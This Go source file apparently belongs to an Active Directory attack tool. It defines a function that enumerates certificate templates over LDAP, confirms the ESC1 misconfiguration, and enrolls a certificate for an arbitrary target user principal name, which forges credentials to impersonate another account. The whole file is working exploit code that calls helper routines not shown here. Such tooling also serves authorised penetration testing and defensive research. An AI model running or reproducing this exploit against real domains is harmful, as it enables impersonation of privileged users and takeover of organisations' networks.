package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"fmt"

	"github.com/go-ldap/ldap/v3"
)

// ExploitESC1 exploits an ESC1-vulnerable template to forge a certificate with an arbitrary UPN.
func ExploitESC1(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC1 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var vulnTemplate *CertTemplate
	for i, t := range templates {
		if t.Name == templateName {
			vulnTemplate = &templates[i]
			break
		}
	}
	if vulnTemplate == nil {
		return nil, nil, fmt.Errorf("template %q not found", templateName)
	}

	isESC1 := false
	for _, v := range vulnTemplate.ESCVulns {
		if v == "ESC1" {
			isESC1 = true
			break
		}
	}
	if !isESC1 {
		return nil, nil, fmt.Errorf("template %q is not ESC1 vulnerable (vulns: %v)", templateName, vulnTemplate.ESCVulns)
	}

	fmt.Printf("[+] Template %q confirmed ESC1 vulnerable\n", templateName)
	fmt.Printf("[*] Enrollee supplies subject: %v\n", vulnTemplate.EnrolleeSuppliesSubject)
	fmt.Printf("[*] Authentication EKU: %v\n", vulnTemplate.AuthenticationEKU)
	fmt.Printf("[*] Manager approval: %v\n", vulnTemplate.RequiresManagerApproval)

	// Since EnrollCertificate is likely making network requests to ADCS,
	// it should ideally also take a context, but we will leave its signature
	// as is for now and focus on LDAP.
	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
	if err != nil {
		return nil, nil, fmt.Errorf("enrollment failed: %w", err)
	}

	fmt.Printf("[+] Certificate obtained for %s via ESC1 on template %q\n", targetUPN, templateName)
	return cert, certKey, nil
}
